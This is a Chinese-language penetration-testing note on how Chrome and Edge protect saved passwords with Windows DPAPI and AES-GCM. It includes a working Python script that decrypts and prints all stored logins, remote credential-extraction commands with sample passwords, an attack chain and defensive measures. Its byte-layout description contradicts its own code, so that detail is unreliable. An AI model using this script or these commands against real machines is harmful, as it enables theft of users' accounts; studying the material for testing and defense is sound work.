# 浏览器密码存储安全 — Chrome/Edge 密码机制与攻击面

> Level 0: 基础原理 / Web 安全
> 基于实战提炼：Win10 Chrome 30条 + Edge 111条 全量导出验证

---

## 一、浏览器密码存储机制

### 1.1 整体架构

```
用户输入密码 → "记住密码？" → 加密存储 → Login Data (SQLite)
                                    ↑
                               Local State (JSON)
                               含加密的master key
```

**密码存储分两层：**
- **外层保护**：通过 Windows DPAPI (Data Protection API) 加密
- **内层保护**：AES-256-GCM 对称加密，密钥来自 DPAPI 解密后的 master key

### 1.2 核心文件

| 文件 | 路径 (Chrome) | 路径 (Edge) | 内容 |
|:----:|:-------------|:------------|:-----|
| **Local State** | `%LOCALAPPDATA%\Google\Chrome\User Data\Local State` | `%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State` | JSON，含加密的 master key |
| **Login Data** | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` | `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data` | SQLite 数据库，存储每条密码 |

### 1.3 Master Key 生成与保护

```
┌─────────────────────────────────────────────────────┐
│ Local State JSON 中的关键字段                        │
├─────────────────────────────────────────────────────┤
│ "os_crypt": {                                       │
│   "encrypted_key": "RFBBUEkBAAAA...base64..."       │
│ }                                                   │
│                                                     │
│ encrypted_key 结构:                                  │
│ 字节 0-4:   "DPAPI" (ASCII签名)                     │
│ 字节 5+:    DPAPI 加密的数据块                       │
└─────────────────────────────────────────────────────┘
```

**解密流程：**
1. 读取 `encrypted_key` → base64 解码
2. 去掉前 5 字节的 `"DPAPI"` 签名
3. 调用 `CryptUnprotectData()` → DPAPI 用当前用户的登录凭据解密
4. 得到 256-bit AES master key

**关键约束：** DPAPI 绑定到 **同一 Windows 用户的同一台机器**。加密时在域/本地用户凭据下，解密也必须在同一凭据下。

### 1.4 密码加密存储格式

SQLite `logins` 表中的每条记录的 `encrypted_value` 字段格式：

```
[v10 byte] [nonce 12 bytes] [ciphertext] [tag 16 bytes]
 |           |               |             |
 0x76       AES-GCM nonce  加密的密码     GCM认证标签
            (随机生成)
```

**解密流程（每条密码）：**
1. 读取 `encrypted_value`
2. 解析: `byte[0]` = 版本 (通常 `v10`=0x76), `byte[1:13]` = nonce, `byte[13:-16]` = ciphertext, `byte[-16:]` = tag
3. AES-256-GCM 解密: `master_key` + `nonce` + `ciphertext` + `tag` → 明文密码

### 1.5 Login Data SQLite 表结构

```sql
CREATE TABLE logins (
  origin_url          TEXT,       -- 网站原始URL
  action_url          TEXT,       -- 登录表单提交URL
  username_element    TEXT,       -- 用户名input的name属性
  username_value      TEXT,       -- 用户名明文
  password_element    TEXT,       -- 密码input的name属性
  password_value      BLOB,       -- 加密的密码
  signon_realm        TEXT,       -- 认证域
  date_created        INTEGER,    -- 创建时间 (1601年基准微秒)
  date_last_used      INTEGER,    -- 最后使用时间
  display_name        TEXT,       -- 显示名
  ...
);
```

---

## 二、解密方法论

### 2.1 本地解密（同一用户同一机器）

```python
import sqlite3, json, base64
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES

# 1. 读取 Local State
with open(local_state_path, 'r', encoding='utf-8') as f:
    state = json.load(f)
enc_key = base64.b64decode(state['os_crypt']['encrypted_key'])
enc_key = enc_key[5:]  # 去掉 "DPAPI" 签名

# 2. DPAPI解密 master key
master_key = CryptUnprotectData(enc_key, None, None, None, 0)[1]

# 3. 读取 Login Data
conn = sqlite3.connect(login_data_path)
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

# 4. 逐条解密
for url, username, encrypted_value in cursor.fetchall():
    if encrypted_value:
        nonce = encrypted_value[3:15]   # v10格式：version(1) + nonce(12)
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        password = cipher.decrypt_and_verify(ciphertext, tag)
        print(f"{url} | {username} | {password.decode('utf-8')}")
```

### 2.2 远程提取工具

| 工具 | 语言 | 功能 | 命令 |
|:----:|:----:|:-----|:-----|
| **SharpChrome** | C# | 直接从远程机器提取浏览器密码 | `SharpChrome.exe logins` |
| **SharpDPAPI** | C# | 提取 master key | `SharpDPAPI.exe masterkeys /rpc` |
| **dploot** | Python | SMB远程提取 | `dploot browser -u Admin -p Pass123 10.0.1.2` |
| **donpapi** | Python | 全量凭据提取 | `donpapi red/Admin:Pass@10.0.0.2` |
| **LaZagne** | Python | 多应用密码提取 | `laZagne.exe browsers` |

### 2.3 远程利用条件

- 拥有目标机器的 **Administrator 权限** (RDP / SMB / PsExec / WMI)
- SMB (445) 端口可达
- 目标用户已登录（DPAPI 需要用户的登录会话凭据）

---

## 三、攻击面分析

### 3.1 信任假设分析

| 假设 | 现实 | 攻击方向 |
|:----|:-----|:---------|
| 密码用 DPAPI 加密 → 安全 | DPAPI 用同一个用户的凭据加解密 → 只要拿到用户权限就能解密 | 提权到目标用户后直接解密 |
| 加密密钥在 Local State 中 → 安全 | Local State 是明文 JSON 文件 | 只需读文件即可获取加密密钥 |
| 需要用户登录才能解密 | 用户登录后 DPAPI 凭据在内存中 | 用已控用户权限直接调用 CryptUnprotectData |

### 3.2 攻击链

```
获取文件系统权限 (RCE/SMB/Everything HTTP/物理访问)
  ↓
读取 %LOCALAPPDATA%\...\Local State (获得加密的master key)
  ↓
读取 %LOCALAPPDATA%\...\Login Data (获得加密的密码库)
  ↓
用同一用户的DPAPI凭据调用 CryptUnprotectData() 解密 master key
  ↓
用 master key AES-GCM 逐条解密密码
  ↓
获得所有明文密码
```

### 3.3 利用场景

| 场景 | 方法 | 实战案例 |
|:----|:-----|:---------|
| RCE 在目标机器 | 本地运行解密脚本 | DVWA RCE → 浏览器密码提取 |
| SMB 远程访问 | dploot/SharpChrome | 横向移动中的凭据收集 |
| 文件系统泄露 | 直接读取 Local State + Login Data | **Everything HTTP → 文件阅读 → 密码导出** |
| 物理访问 | 直接登录系统运行程序 | 办公室渗透测试 |

### 3.4 无法解密的情况

- 用户已注销/切换（DPAPI 会话凭据已释放）
- 使用不同的用户登录（DPAPI 绑定到加密时的用户）
- 文件复制到另一台机器（DPAPI 绑定到机器+用户）
- Windows Hello/PIN 登录时使用不同的密钥保护

---

## 四、防御建议

| 措施 | 效果 | 代价 |
|:----|:-----|:-----|
| 不使用浏览器记住密码 | 100%杜绝 | 降低用户体验 |
| 使用专用密码管理器 | 加密强度更高，跨平台 | 需要额外软件 |
| 开启 BitLocker | 物理访问时保护所有文件 | 性能轻微损失 |
| 限制管理员权限 | 阻止攻击者用同一用户解密 | 运维灵活性降低 |
| 启用 Windows Defender ATP | 检测异常 DPAPI 调用 | 需要 E5 许可 |

---

## 五、实战关联

- **来源案例**: `case-win10-full-breach.md` — Everything HTTP → Local State + Login Data 文件下载 → 本地解密 141 条密码
- **关联模式**: Everything HTTP 文件系统泄露 → DPAPI 绕过（同用户本地解密）
- **密码模式分析**: 参见 `case-win10-password-analysis.md`

---

## 参考

- [Chrome Password Storage - The Chromium Projects](https://www.chromium.org/developers/design-documents/network-stack/)
- [DPAPI - Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/dpapi/)
- [PentestLab: Web Browser Stored Credentials](https://pentestlab.blog/2024/08/20/web-browser-stored-credentials/)
- [ipurple.team: Browser Stored Credentials](https://ipurple.team/2024/09/10/browser-stored-credentials/)
- [SharpDPAPI: GitHub Repo](https://github.com/GhostPack/SharpDPAPI)
- [dploot: GitHub Repo](https://github.com/p0dalirius/dploot)
